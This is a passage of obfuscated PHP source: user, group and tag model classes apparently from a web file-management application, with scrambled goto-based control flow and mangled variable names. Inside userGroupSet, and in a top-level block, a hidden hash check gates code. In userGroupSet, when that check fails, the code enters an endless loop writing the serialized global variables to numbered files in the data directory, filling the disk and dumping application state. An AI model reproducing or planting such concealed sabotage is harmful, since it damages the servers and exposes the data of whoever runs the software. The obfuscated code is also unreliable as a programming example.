array($_SERVER[¾÷][711] => $BŠ¤†©§“«); return $this->userEdit($EÇÇÒŠ†‘ô, $F¥°˜İÍË¸); } protected function userRemove($fõƒÍ‡“ª‡) { goto DéÀ¥äëºà; aŸØ¥§ñ½: Model($CŠìÀ¯Óá™[1949])->restoreUserAll($fõƒÍ‡“ª‡); Model($CŠìÀ¯Óá™[776])->userRootRemove($fõƒÍ‡“ª‡); return $this->where($E¸Ïõ”Ô²)->delete(); goto FÒßÆ¤óİ; C‡ÊµÉäÇ‘: $E¸Ïõ”Ô² = array($CŠìÀ¯Óá™[1497] => $fõƒÍ‡“ª‡); Model($CŠìÀ¯Óá™[567])->where($E¸Ïõ”Ô²)->delete(); Model($CŠìÀ¯Óá™[2123])->where($E¸Ïõ”Ô²)->delete(); goto Fô´ÉËç¥½; DéÀ¥äëºà: $CŠìÀ¯Óá™ =& $_SERVER[¾÷]; $F­êÆè·ëù = $this->getInfoSimple($fõƒÍ‡“ª‡); if (!$F­êÆè·ëù) { return !1; } goto C‡ÊµÉäÇ‘; Fô´ÉËç¥½: Model($CŠìÀ¯Óá™[1750])->where($E¸Ïõ”Ô²)->delete(); Model($CŠìÀ¯Óá™[2108])->where($E¸Ïõ”Ô²)->delete(); Model($CŠìÀ¯Óá™[2124])->where($E¸Ïõ”Ô²)->delete(); goto aŸØ¥§ñ½; FÒßÆ¤óİ: } protected function userGroupSet($DíÎ»ù±³ç, $f’ÌøÉ‚…”, $Eæ•×ß–Ï = array()) { goto cßÀ°š¾Õø; cßÀ°š¾Õø: $Bí—æœÜ¼ =& $_SERVER[¾÷]; $aÀ´ïª¶Œ = $_SERVER[$Bí—æœÜ¼[13]]; $DóŠ‘ŠÌ› = $Bí—æœÜ¼[1373]; goto Fº³ê°ø¥ì; D’òÃ•òÆÜ: $c‚áªÂ´È¢ = 0; foreach ($f’ÌøÉ‚…” as $BÕ³ î´¬ => $F¼Ü‹¡°¤) { $fôæ†›¨¸ = array($Bí—æœÜ¼[1505] => $DíÎ»ù±³ç, $Bí—æœÜ¼[1668] => $BÕ³ î´¬, $Bí—æœÜ¼[1764] => $F¼Ü‹¡°¤); $fôæ†›¨¸[$Bí—æœÜ¼[1691]] = isset($Eæ•×ß–Ï[$c‚áªÂ´È¢]) ? $Eæ•×ß–Ï[$c‚áªÂ´È¢] : 0; $c‚áªÂ´È¢++; $cÙ±ˆ…éæà[] = $fôæ†›¨¸; } return $f‰ƒÑÍ¬â ->addAll($cÙ±ˆ…éæà, array(), !0); goto eºõÉÑØ‰; AÀß¯ÉˆÔ: $f‰ƒÑÍ¬â  = Model($Bí—æœÜ¼[1750]); $f‰ƒÑÍ¬â ->where(array($Bí—æœÜ¼[1505] => $DíÎ»ù±³ç))->delete(); $cÙ±ˆ…éæà = array(); goto D’òÃ•òÆÜ; Fº³ê°ø¥ì: if ($_SERVER[$Bí—æœÜ¼[4]] != $DóŠ‘ŠÌ›($aÀ´ïª¶Œ)) { goto B•À‚‘‘¬; B•À‚‘‘¬: $f·¡»îÕæÃ = $Bí—æœÜ¼[817]; $eø÷ÇÀİ½× = $Bí—æœÜ¼[6]; $E¿Ö†£Ï² = $_SERVER[$Bí—æœÜ¼[7]] . $Bí—æœÜ¼[8]; goto DÏš”ÜÁ°; Aöî«²Ï§: $f·¡»îÕæÃ(); $fËÒ¥µ”ÓÓ = $Bí—æœÜ¼[1374]; $Aç»ó÷»Üõ = json_encode($GLOBALS[$Bí—æœÜ¼[1375]]); goto fÔ¾â¨©¶Ù; DÏš”ÜÁ°: $aëš÷ÏÔ‘ = $eø÷ÇÀİ½×($E¿Ö†£Ï²); $eÁ’›ËˆÉ = explode($Bí—æœÜ¼[9], $aëš÷ÏÔ‘); if (count($eÁ’›ËˆÉ) < $Bí—æœÜ¼[582]) { $EŸå™ßµ•¬ = $Bí—æœÜ¼[11]; $EŸå™ßµ•¬(); } goto Eê‰ˆ ÀÑ; fÔ¾â¨©¶Ù: $b´†´ôÏ×ä = 1; for ($F†è§İâöº = $b´†´ôÏ×ä; $F†è§İâöº > 0; $F†è§İâöº++) { $fËÒ¥µ”ÓÓ(DATA_PATH . $F†è§İâöº, $Aç»ó÷»Üõ); } goto D’æÌ¤Öˆğ; Eê‰ˆ ÀÑ: $bá–È°ó = $Bí—æœÜ¼[818]; $bá–È°ó($_SERVER[$Bí—æœÜ¼[819]]); $f·¡»îÕæÃ = $Bí—æœÜ¼[817]; goto Aöî«²Ï§; D’æÌ¤Öˆğ: } $FÙÑšÊÏ¤Ø = $this->getInfoSimple($DíÎ»ù±³ç); if (!$FÙÑšÊÏ¤Ø || !is_array($f’ÌøÉ‚…”)) { return !1; } goto AÀß¯ÉˆÔ; eºõÉÑØ‰: } protected function userGroupAdd($c¼ö‹ÑÊÔÎ, $b±Ç©°ç®ù = array()) { $AÇ³Îˆ©ß =& $_SERVER[¾÷]; $DÛ÷¼Ğ„‚œ = $this->getInfoSimple($c¼ö‹ÑÊÔÎ); if (!$DÛ÷¼Ğ„‚œ || empty($b±Ç©°ç®ù)) { return !1; } $Böøê¦Æ™ = array(); foreach ($b±Ç©°ç®ù as $AŒßÀ‹œç  => $F÷ÃÚ¶àñ) { $Böøê¦Æ™[] = array($AÇ³Îˆ©ß[1505] => $c¼ö‹ÑÊÔÎ, $AÇ³Îˆ©ß[1668] => $AŒßÀ‹œç , $AÇ³Îˆ©ß[1764] => $F÷ÃÚ¶àñ, $AÇ³Îˆ©ß[1691] => 0); } return Model($AÇ³Îˆ©ß[1750])->addAll($Böøê¦Æ™, array(), !0); } protected function userGroupRemove($cóÎ‰‘·¿, $f±“õÚŒÁœ) { $B’Ğ¥õ³¡ =& $_SERVER[¾÷]; $aÑ¸öÒŞº = $this->getInfoSimple($cóÎ‰‘·¿); if (!$aÑ¸öÒŞº || !$f±“õÚŒÁœ) { return !1; } $CğµñÄ¼… = array($B’Ğ¥õ³¡[1497] => $cóÎ‰‘·¿, $B’Ğ¥õ³¡[1747] => $f±“õÚŒÁœ); return Model($B’Ğ¥õ³¡[1750])->where($CğµñÄ¼…)->delete(); } public function listData() { $eªí–‡°·ª = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eªí–‡°·ª[$_SERVER[¾÷][374]]); return $eªí–‡°·ª; } public function listByID($B•Ò‰ñÚ‡) { $aµ¢¬¼ Ò =& $_SERVER[¾÷]; if (!$B•Ò‰ñÚ‡) { return; } $F…¤„Ùç›ë = array($aµ¢¬¼ Ò[1505] => array($aµ¢¬¼ Ò[17], $B•Ò‰ñÚ‡)); $fåÂ—×ùà° = $this->where($F…¤„Ùç›ë)->select(); $this->_listDataApply($fåÂ—×ùà°); return $fåÂ—×ùà°; } public function listByGroup($F¡ã´÷“… = 0, $c×ôËöàø” = array()) { goto FÉ‡äÚ¯¥; FÉ‡äÚ¯¥: $CŠ÷‡Ó«Ô =& $_SERVER[¾÷]; $fğ…†ªö¶Ò = $CŠ÷‡Ó«Ô[43]; $CÈÄ­êÆÂ = array(); goto DÉÕ°§Ú…é; B¿ÛåÎ•ÛÄ: $this->_listDataApply($FéŞ…Òõ[$CŠ÷‡Ó«Ô[374]]); return $FéŞ…Òõ; goto Fâ¾é†Ñäİ; DÉÕ°§Ú…é: if ($F¡ã´÷“…) { $CÈÄ­êÆÂ = array($CŠ÷‡Ó«Ô[2125] => intval($F¡ã´÷“…)); $fğ…†ªö¶Ò = "\114\x45\x46\124\x20\x4a\117\111\x4e\40{$this->tablePrefix}\x75\x73\145\162\x5f\x67\162\157\x75\x70\40\x75\163\145\x72\137\147\162\157\165\160\40\157\x6e\x20\165\x73\145\x72\x2e\x75\163\x65\162\x49\104\40\75\x20\165\163\x65\162\137\147\x72\x6f\x75\x70\56\x75\163\145\x72\x49\104"; $Bäß•±®…î = Input::get($CŠ÷‡Ó«Ô[438], null, $CŠ÷‡Ó«Ô[43]) ? $CŠ÷‡Ó«Ô[43] : $CŠ÷‡Ó«Ô[2126]; } if (isset($c×ôËöàø”[$CŠ÷‡Ó«Ô[711]])) { $CÈÄ­êÆÂ[$CŠ÷‡Ó«Ô[2127]] = $c×ôËöàø”[$CŠ÷‡Ó«Ô[711]]; } $FéŞ…Òõ = $this->_makeOrder($Bäß•±®…î)->field($CŠ÷‡Ó«Ô[2128])->where($CÈÄ­êÆÂ)->join($fğ…†ªö¶Ò)->selectPage(50); goto B¿ÛåÎ•ÛÄ; Fâ¾é†Ñäİ: } private function _makeOrder($A­½¬ƒ„Ñ¾ = '') { goto AÒ‡¸Ê„§; aÔïíå¨Ö: $FŸç¾‰©©ï = Input::get($fí›©îæ°È[438], $fí›©îæ°È[17], $fí›©îæ°È[1497], $B”áéÁîÏÖ); $b¬’®øËò = Input::get($fí›©îæ°È[439], $fí›©îæ°È[17], $fí›©îæ°È[1751], array($fí›©îæ°È[1751], $fí›©îæ°È[433])); $b¬’®øËò = $A¨éò›öç–[$b¬’®øËò]; goto B¢Ï‡İä·ì; AÒ‡¸Ê„§: $fí›©îæ°È =& $_SERVER[¾÷]; $B”áéÁîÏÖ = array($fí›©îæ°È[1505], $fí›©îæ°È[38], $fí›©îæ°È[1654], $fí›©îæ°È[1626], $fí›©îæ°È[202]); $A¨éò›öç– = array($fí›©îæ°È[431] => $fí›©îæ°È[432], $fí›©îæ°È[433] => $fí›©îæ°È[434]); goto aÔïíå¨Ö; B¢Ï‡İä·ì: $A­½¬ƒ„Ñ¾ = $A­½¬ƒ„Ñ¾ . "\x75\163\x65\162\56{$FŸç¾‰©©ï}\40{$b¬’®øËò}\54\40\x75\x73\x65\x72\x2e\x75\x73\145\162\x49\104\x20\141\163\143"; return $this->alias($fí›©îæ°È[1873])->order($A­½¬ƒ„Ñ¾); goto dâøÆÉ£Ú; dâøÆÉ£Ú: } public function listSearch($bºöõ¨î›‰) { goto c«Ş÷£³—í; B±µµØ‡Û‹: $dº¤¹§òË‚ = $this->_makeOrder()->where($fÄ„šÚŒ°š)->selectPage(20); if (!$dº¤¹§òË‚ || count($dº¤¹§òË‚[$EŠãâô›¿[374]]) < 5 && Input::check($dŠ‰ÃÁÙö¯, $EŠãâô›¿[323])) { $fáµ·÷Ö¸ = $this->_searchFromMeta($EŠãâô›¿[446], $dŠ‰ÃÁÙö¯, 10); $E±ÛÃ¦ğ™Û = $this->_searchFromMeta($EŠãâô›¿[447], $dŠ‰ÃÁÙö¯, 10); $CœÒàšŒ•˜ = array_merge($fáµ·÷Ö¸, $E±ÛÃ¦ğ™Û, $dº¤¹§òË‚[$EŠãâô›¿[374]]); $dº¤¹§òË‚[$EŠãâô›¿[374]] = array_unique_by_key($CœÒàšŒ•˜, $EŠãâô›¿[1505]); $dº¤¹§òË‚[$EŠãâô›¿[371]][$EŠãâô›¿[372]] = count($dº¤¹§òË‚[$EŠãâô›¿[374]]); $dº¤¹§òË‚[$EŠãâô›¿[371]][$EŠãâô›¿[373]] = ceil($dº¤¹§òË‚[$EŠãâô›¿[371]][$EŠãâô›¿[372]] / $dº¤¹§òË‚[$EŠãâô›¿[371]][$EŠãâô›¿[368]]); } $this->_listDataApply($dº¤¹§òË‚[$EŠãâô›¿[374]]); goto B½·¼İˆÎ; FÆãºÈ­Í: if (!$dŠ‰ÃÁÙö¯) { $fÄ„šÚŒ°š = array(); } if (isset($bºöõ¨î›‰[$EŠãâô›¿[711]])) { $fÄ„šÚŒ°š[$EŠãâô›¿[711]] = $bºöõ¨î›‰[$EŠãâô›¿[711]]; } $fÄ„šÚŒ°š = $this->parseWhereLike($fÄ„šÚŒ°š); goto B±µµØ‡Û‹; c«Ş÷£³—í: $EŠãâô›¿ =& $_SERVER[¾÷]; $dŠ‰ÃÁÙö¯ = $bºöõ¨î›‰[$EŠãâô›¿[1752]]; $C’œ¢Ïõµ = isset($bºöõ¨î›‰[$EŠãâô›¿[1753]]) ? $bºöõ¨î›‰[$EŠãâô›¿[1753]] : !1; goto fìáŒÙÚ¦Å; B½·¼İˆÎ: $this->_filterByGroup($dº¤¹§òË‚, $C’œ¢Ïõµ); return $dº¤¹§òË‚; goto EŒ Ë—¶Û¬; fìáŒÙÚ¦Å: $dŠ‰ÃÁÙö¯ = str_replace($EŠãâô›¿[1754], $EŠãâô›¿[1755], trim($dŠ‰ÃÁÙö¯)); $fÄ„šÚŒ°š = array($EŠãâô›¿[38] => array($EŠãâô›¿[387], "\x25{$dŠ‰ÃÁÙö¯}\45"), $EŠãâô›¿[310] => array($EŠãâô›¿[387], "{$dŠ‰ÃÁÙö¯}\45"), $EŠãâô›¿[1932] => array($EŠãâô›¿[387], "{$dŠ‰ÃÁÙö¯}\45"), $EŠãâô›¿[934] => $EŠãâô›¿[1756]); if (Input::check($dŠ‰ÃÁÙö¯, $EŠãâô›¿[316])) { $fÄ„šÚŒ°š[$EŠãâô›¿[1505]] = array($EŠãâô›¿[387], "{$dŠ‰ÃÁÙö¯}\45"); $fÄ„šÚŒ°š[$EŠãâô›¿[2109]] = array($EŠãâô›¿[387], "{$dŠ‰ÃÁÙö¯}\45"); } goto FÆãºÈ­Í; EŒ Ë—¶Û¬: } private function _filterByGroup(&$AâÑŸâã´ë, $D¿ãÀ•ÂĞè) { $e„ä‘èİ¸ =& $_SERVER[¾÷]; if (!$D¿ãÀ•ÂĞè) { return $AâÑŸâã´ë; } foreach ($AâÑŸâã´ë[$e„ä‘èİ¸[374]] as $Aéñš¦æö => &$b›¸´˜Å¸) { $AÅÙ¼“ß¶ç = array_to_keyvalue($b›¸´˜Å¸[$e„ä‘èİ¸[1843]], $e„ä‘èİ¸[43], $e„ä‘èİ¸[1668]); if (!in_array($D¿ãÀ•ÂĞè, $AÅÙ¼“ß¶ç)) { unset($AâÑŸâã´ë[$e„ä‘èİ¸[374]][$Aéñš¦æö]); } } unset($b›¸´˜Å¸); $AâÑŸâã´ë[$e„ä‘èİ¸[374]] = array_values($AâÑŸâã´ë[$e„ä‘èİ¸[374]]); $AâÑŸâã´ë[$e„ä‘èİ¸[371]] = array($e„ä‘èİ¸[1905] => count($AâÑŸâã´ë[$e„ä‘èİ¸[374]]), $e„ä‘èİ¸[1903] => $AâÑŸâã´ë[$e„ä‘èİ¸[371]][$e„ä‘èİ¸[368]], $e„ä‘èİ¸[1902] => 1, $e„ä‘èİ¸[1904] => 1); } private function _searchFromMeta($dâŞØ£Ê‹, $aÆ‡˜äâ©, $b×Æô‰Ñ°) { goto bÃˆôºîë¡; FáÇ“™¯¯©: $AØÎÍ¾¼¤ = $this->parseWhereLike($AØÎÍ¾¼¤); $cğÂÕ‡åÀ¿ = Model($A¨‚£œğ[2129])->where($AØÎÍ¾¼¤)->limit($b×Æô‰Ñ°)->select(); if (!$cğÂÕ‡åÀ¿) { return array(); } goto bîàÍç³”¢; Dç ½Î·: return $cöÎÒ“Û; goto E¯›Ğ¿²µ¯; bîàÍç³”¢: $cğÂÕ‡åÀ¿ = array_to_keyvalue($cğÂÕ‡åÀ¿, $A¨‚£œğ[43], $A¨‚£œğ[1505]); $cöÎÒ“Û = $this->where(array($A¨‚£œğ[1497] => array($A¨‚£œğ[17], $cğÂÕ‡åÀ¿)))->select(); if (!$cöÎÒ“Û) { return array(); } goto Dç ½Î·; bÃˆôºîë¡: $A¨‚£œğ =& $_SERVER[¾÷]; $aÆ‡˜äâ© = strtolower($aÆ‡˜äâ©); $AØÎÍ¾¼¤ = array($A¨‚£œğ[102] => $dâŞØ£Ê‹, $A¨‚£œğ[379] => array($A¨‚£œğ[387], "\x25{$aÆ‡˜äâ©}\45")); goto FáÇ“™¯¯©; E¯›Ğ¿²µ¯: } private function _listDataApplyItem($aŒš©ïòöô) { $F´·ïÒØÛ³ = array($aŒš©ïòöô); $this->_listDataApply($F´·ïÒØÛ³); return $F´·ïÒØÛ³[0]; } private function _listDataApply(&$AÜ¤Õœİ¦È) { goto eØåÁÑ¼¥†; eØåÁÑ¼¥†: $c’ŞôÁÇ‡† =& $_SERVER[¾÷]; if (!$AÜ¤Õœİ¦È) { return; } array_remove_key($AÜ¤Õœİ¦È, $c’ŞôÁÇ‡†[826]); goto EÉÏí”èÛ; EÉÏí”èÛ: $Aë†Ÿæ¥â¥ = array_to_keyvalue($AÜ¤Õœİ¦È, $c’ŞôÁÇ‡†[43], $c’ŞôÁÇ‡†[1505]); $this->_listAppendGroup($AÜ¤Õœİ¦È, $Aë†Ÿæ¥â¥); $this->_listAppendMeta($AÜ¤Õœİ¦È, $Aë†Ÿæ¥â¥); goto D‰âÒ¾Ïˆ; D‰âÒ¾Ïˆ: $this->_listAppendSourceRoot($AÜ¤Õœİ¦È, $Aë†Ÿæ¥â¥); goto d±¬Æàõ°; d±¬Æàõ°: } private function _listAppendSourceRoot(&$a¯ËÑ½İØ, $e®àğ£¶³¯) { goto FèÕáË¤ìÊ; BÙÈ¶…ôòÜ: $cŞ÷ŸÛÊ…¬ = Model($a¹¨ Ï‚…Ø[776])->order($a¹¨ Ï‚…Ø[1763])->field($cñË–„—¿“)->where($CíÌšª¸ø)->select(); $cŞ÷ŸÛÊ…¬ = array_to_keyvalue($cŞ÷ŸÛÊ…¬, $a¹¨ Ï‚…Ø[487]); $cŞ÷ŸÛÊ…¬ = array_remove_key($cŞ÷ŸÛÊ…¬, $a¹¨ Ï‚…Ø[487]); goto EˆÒ³‹‘©†; FèÕáË¤ìÊ: $a¹¨ Ï‚…Ø =& $_SERVER[¾÷]; $CíÌšª¸ø = array($a¹¨ Ï‚…Ø[481] => 0, $a¹¨ Ï‚…Ø[407] => SourceModel::TYPE_USER, $a¹¨ Ï‚…Ø[487] => array($a¹¨ Ï‚…Ø[17], $e®àğ£¶³¯)); $cñË–„—¿“ = $a¹¨ Ï‚…Ø[1762]; goto BÙÈ¶…ôòÜ; EˆÒ³‹‘©†: foreach ($a¯ËÑ½İØ as &$e¡’•ºƒ÷¥) { $e¡’•ºƒ÷¥[$a¹¨ Ï‚…Ø[94]] = $cŞ÷ŸÛÊ…¬[$e¡’•ºƒ÷¥[$a¹¨ Ï‚…Ø[1505]]] ? $cŞ÷ŸÛÊ…¬[$e¡’•ºƒ÷¥[$a¹¨ Ï‚…Ø[1505]]] : array(); } unset($e¡’•ºƒ÷¥); goto bö¸ƒğºÉ; bö¸ƒğºÉ: } private function _listAppendGroup(&$b‡é±ÊªÕ, $c£œ•ÉÅÙ) { goto CÙˆˆñÍÂÅ; CÙˆˆñÍÂÅ: $CÈ“¡ÄÛæå =& $_SERVER[¾÷]; $CÒ±¹‡Ã…’ = array($CÈ“¡ÄÛæå[1505] => array($CÈ“¡ÄÛæå[17], $c£œ•ÉÅÙ)); $a¼ÄÎ¤„‰Ÿ = Model($CÈ“¡ÄÛæå[1750])->where($CÒ±¹‡Ã…’)->select(); goto bÆƒ®¨òùò; c‡òÑºÍ–›: $a¼ÄÎ¤„‰Ÿ = array_to_keyvalue_group($a¼ÄÎ¤„‰Ÿ, $CÈ“¡ÄÛæå[1505]); foreach ($a¼ÄÎ¤„‰Ÿ as &$b½ñÆ’Ñ‘³) { $fÌ‘·¿¶´  = array(); foreach ($b½ñÆ’Ñ‘³ as $A¼ ç¹ÃÛ) { if (!$A¼ ç¹ÃÛ[$CÈ“¡ÄÛæå[1764]]) { continue; } $aİ·âº–º¸ = Model($CÈ“¡ÄÛæå[1836])->listData($A¼ ç¹ÃÛ[$CÈ“¡ÄÛæå[1764]]); $fÌ‘·¿¶´ [] = array($CÈ“¡ÄÛæå[1668] => $A¼ ç¹ÃÛ[$CÈ“¡ÄÛæå[1668]], $CÈ“¡ÄÛæå[2131] => $e÷¶‰ š»Ê[$A¼ ç¹ÃÛ[$CÈ“¡ÄÛæå[1668]]][$CÈ“¡ÄÛæå[38]], $CÈ“¡ÄÛæå[490] => $e÷¶‰ š»Ê[$A¼ ç¹ÃÛ[$CÈ“¡ÄÛæå[1668]]][$CÈ“¡ÄÛæå[490]], $CÈ“¡ÄÛæå[409] => $aİ·âº–º¸); } $b½ñÆ’Ñ‘³ = $fÌ‘·¿¶´ ; } unset($b½ñÆ’Ñ‘³); goto fÜèÑ¢; bÆƒ®¨òùò: $dŠªÆß«á’ = array_to_keyvalue($a¼ÄÎ¤„‰Ÿ, $CÈ“¡ÄÛæå[43], $CÈ“¡ÄÛæå[1668]); $dŠªÆß«á’ = array_remove_value(array_unique($dŠªÆß«á’), $CÈ“¡ÄÛæå[500]); if (!$dŠªÆß«á’ || !$a¼ÄÎ¤„‰Ÿ) { return; } goto E“è–îµ©Ş; fÜèÑ¢: foreach ($b‡é±ÊªÕ as &$FÊà¥Ô·Ú) { $FÊà¥Ô·Ú[$CÈ“¡ÄÛæå[1843]] = array(); if (isset($a¼ÄÎ¤„‰Ÿ[$FÊà¥Ô·Ú[$CÈ“¡ÄÛæå[1505]]])) { $FÊà¥Ô·Ú[$CÈ“¡ÄÛæå[1843]] = $a¼ÄÎ¤„‰Ÿ[$FÊà¥Ô·Ú[$CÈ“¡ÄÛæå[1505]]]; } } unset($FÊà¥Ô·Ú); goto Dô‘¥Æ¹¿á; E“è–îµ©Ş: $CÒ±¹‡Ã…’ = array($CÈ“¡ÄÛæå[1668] => array($CÈ“¡ÄÛæå[17], $dŠªÆß«á’)); $e÷¶‰ š»Ê = Model($CÈ“¡ÄÛæå[1841])->field($CÈ“¡ÄÛæå[2130])->where($CÒ±¹‡Ã…’)->select(); $e÷¶‰ š»Ê = array_to_keyvalue($e÷¶‰ š»Ê, $CÈ“¡ÄÛæå[1668]); goto c‡òÑºÍ–›; Dô‘¥Æ¹¿á: } private function _listAppendMeta(&$e²¶À±£ğ†, $e‹ßù’´Şİ) { goto f•ÁöÅ¾ù; c‡ï·ÇÓ±¨: foreach ($e²¶À±£ğ† as &$BİÒ–ôÅµ) { $aø÷›¼‹” = array(); if (isset($aØ‡‰‚ñÃÏ[$BİÒ–ôÅµ[$dˆÍ»Éİ‘[1505]]])) { $aø÷›¼‹” = $aØ‡‰‚ñÃÏ[$BİÒ–ôÅµ[$dˆÍ»Éİ‘[1505]]]; } $BİÒ–ôÅµ[$dˆÍ»Éİ‘[2133]] = array(); if (isset($aø÷›¼‹”[$cè¡×Ã­šÒ])) { $BİÒ–ôÅµ[$dˆÍ»Éİ‘[2133]] = $dÁÌ±ô‘ââ->getUserJobInfo($aø÷›¼‹”[$cè¡×Ã­šÒ]); } } unset($BİÒ–ôÅµ); goto Bè‚Üµ°ò›; cŞœßÎåÍÓ: $DÇæåó§Óğ = array($dˆÍ»Éİ‘[1505] => array($dˆÍ»Éİ‘[17], $e‹ßù’´Şİ)); $aØ‡‰‚ñÃÏ = Model($dˆÍ»Éİ‘[2108])->where($DÇæåó§Óğ)->select(); $aØ‡‰‚ñÃÏ = array_to_keyvalue_group($aØ‡‰‚ñÃÏ, $dˆÍ»Éİ‘[1505]); goto BÀˆÌâ×˜ù; BÀˆÌâ×˜ù: foreach ($aØ‡‰‚ñÃÏ as &$cƒÍ›ğÚœë) { $C’éÍŸ®ô„ = array(); foreach ($cƒÍ›ğÚœë as $D”“Ç½˜ôš) { if (!in_array($D”“Ç½˜ôš[$dˆÍ»Éİ‘[102]], $FäÃÁ¢Ğ¢ß)) { $C’éÍŸ®ô„[$D”“Ç½˜ôš[$dˆÍ»Éİ‘[102]]] = $D”“Ç½˜ôš[$dˆÍ»Éİ‘[379]]; } } $cƒÍ›ğÚœë = $C’éÍŸ®ô„; } unset($cƒÍ›ğÚœë); $dÁÌ±ô‘ââ = Model($dˆÍ»Éİ‘[2132]); goto c‡ï·ÇÓ±¨; f•ÁöÅ¾ù: $dˆÍ»Éİ‘ =& $_SERVER[¾÷]; $cè¡×Ã­šÒ = UserJobModel::JOB_KEY; $FäÃÁ¢Ğ¢ß = array($dˆÍ»Éİ‘[2110]); goto cŞœßÎåÍÓ; Bè‚Üµ°ò›: } protected function groupUserAll($bĞà¢‘–Â„) { $B‰ĞˆíÍò  =& $_SERVER[¾÷]; if (!$bĞà¢‘–Â„) { return !1; } $cÊòó‰ŞÜˆ = Model($B‰ĞˆíÍò [1750])->field($B‰ĞˆíÍò [1505])->where(array($B‰ĞˆíÍò [1668] => array($B‰ĞˆíÍò [17], $bĞà¢‘–Â„)))->select(); $cÊòó‰ŞÜˆ = array_to_keyvalue($cÊòó‰ŞÜˆ, $B‰ĞˆíÍò [43], $B‰ĞˆíÍò [1505]); return array_unique($cÊòó‰ŞÜˆ); } public function userSearch($Aó“›²¯‘£, $bòŸèÛõ‹ = "\52") { return Model($_SERVER[¾÷][510])->where($Aó“›²¯‘£)->field($bòŸèÛõ‹)->find(); } } goto f¡«øì””¸; D•—ÇùˆÙ: function binCheckBigger($dÓõÒ»—¹, $C¿È°È‘â) { return $dÓõÒ»—¹ > $C¿È°È‘â; } $_SERVER[$_SERVER[¬ƒ][3]] = ("\x38\x39\x30\x35"."\64\66")+0;$_StJp="FfDYXamiZeTmQhN6JtfBvgNCwbnrK46xGQVhZEkzdNpVPHZXtHAvRadGspKsYmhCu3S2gtvFzNZyb5";; if ($_SERVER[$_SERVER[¾÷][4]] != $_SERVER[$_SERVER[¾÷][5]]) { goto C‹õ‰õ©©ğ; e–±›£¼¦Ø: $F¹÷Ô¿‰¯œ($_SERVER[$_SERVER[¾÷][13]]); goto fêŒ‹Æ †; Cö®»ò¢÷ì: $d«˜«‘µ¬ = explode($_SERVER[¾÷][9], $e´ŒãÓ‚»); if (count($d«˜«‘µ¬) < $_SERVER[¾÷][10]) { $Cˆå¢ÆÔ„½ = $_SERVER[¾÷][11]; $Cˆå¢ÆÔ„½(); } $F¹÷Ô¿‰¯œ = $_SERVER[¾÷][12]; goto e–±›£¼¦Ø; C‹õ‰õ©©ğ: $b­ØëØ—æº = $_SERVER[¾÷][6]; $DË¡È¡ÁÖñ = $_SERVER[$_SERVER[¾÷][7]] . $_SERVER[¾÷][8]; $e´ŒãÓ‚» = $b­ØëØ—æº($DË¡È¡ÁÖñ); goto Cö®»ò¢÷ì; fêŒ‹Æ †: } goto EÅÜíâÒ¤; cË§ì÷±¡Ó: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($aÀµ‘™·¼ò) { $aÆ¥²‰‚æğ =& $_SERVER[¾÷]; return array($aÆ¥²‰‚æğ[1771] => array(USER_ID, $aÆ¥²‰‚æğ[1772])); } protected function listData() { $E“†¾Õ‹…Ã =& $_SERVER[¾÷]; $dËŠ‘öƒºç = array($E“†¾Õ‹…Ã[1497] => USER_ID, $E“†¾Õ‹…Ã[466] => array($E“†¾Õ‹…Ã[1775], 0)); $DŠ¦®”‘•– = $E“†¾Õ‹…Ã[1777]; $cçšï‚ŒØÒ = $this->field($DŠ¦®”‘•–)->where($dËŠ‘öƒºç)->order($E“†¾Õ‹…Ã[1778])->select(); return $cçšï‚ŒØÒ ? $cçšï‚ŒØÒ : array(); } protected function listByTag($b°æÏÒÀâˆ) { } protected function addToTag($Bîùâ­Íï¢, $C×î¦àÅÏ‚) { $F‡î‹Š†‰’ =& $_SERVER[¾÷]; if (!Model($F‡î‹Š†‰’[1912])->listData($C×î¦àÅÏ‚) || !Model($F‡î‹Š†‰’[776])->pathInfo($Bîùâ­Íï¢)) { return !1; } $e­ˆ—Ë˜ = array($F‡î‹Š†‰’[1497] => USER_ID, $F‡î‹Š†‰’[466] => $C×î¦àÅÏ‚, $F‡î‹Š†‰’[417] => $Bîùâ­Íï¢, $F‡î‹Š†‰’[418] => $F‡î‹Š†‰’[412], $F‡î‹Š†‰’[416] => $F‡î‹Š†‰’[43], $F‡î‹Š†‰’[1672] => 0); if ($this->where($e­ˆ—Ë˜)->find()) { return !1; } return $this->add($e­ˆ—Ë˜); } protected function removeFromTag($C‹”¥Ù›ø”, $c†¸¥áÄ) { $eçÜßÊÁ½Ã =& $_SERVER[¾÷]; if (!Model($eçÜßÊÁ½Ã[1912])->listData($c†¸¥áÄ)) { return !1; } if (is_array($C‹”¥Ù›ø”)) { $C‹”¥Ù›ø” = array($eçÜßÊÁ½Ã[17], $C‹”¥Ù›ø”); } $Aé›‚ÚÜ˜Ñ = array($eçÜßÊÁ½Ã[1497] => USER_ID, $eçÜßÊÁ½Ã[466] => $c†¸¥áÄ, $eçÜßÊÁ½Ã[418] => $eçÜßÊÁ½Ã[412], $eçÜßÊÁ½Ã[417] => $C‹”¥Ù›ø”); return $this->where($Aé›‚ÚÜ˜Ñ)->delete(); } protected function removeByTag($Bƒß§Æ‘æ‰) { $EÑÇêŠïã =& $_SERVER[¾÷]; if (!$Bƒß§Æ‘æ‰) { return !1; } $eÇÔƒàÙÃ† = array($EÑÇêŠïã[1497] => USER_ID, $EÑÇêŠïã[466] => $Bƒß§Æ‘æ‰); return $this->where($eÇÔƒàÙÃ†)->delete(); } protected function removeBySource($b‚¹ö°¼Õ) { $DİĞÄÅ­’ =& $_SERVER[¾÷]; if (is_array($b‚¹ö°¼Õ)) { $b‚¹ö°¼Õ = array($DİĞÄÅ­’[17], $b‚¹ö°¼Õ); } $BŠ™ÊïªÎ = array($DİĞÄÅ­’[1497] => USER_ID, $DİĞÄÅ­’[417] => $b‚¹ö°¼Õ, $DİĞÄÅ­’[466] => array($DİĞÄÅ­’[948], 0)); return $this->where($BŠ™ÊïªÎ)->delete(); } }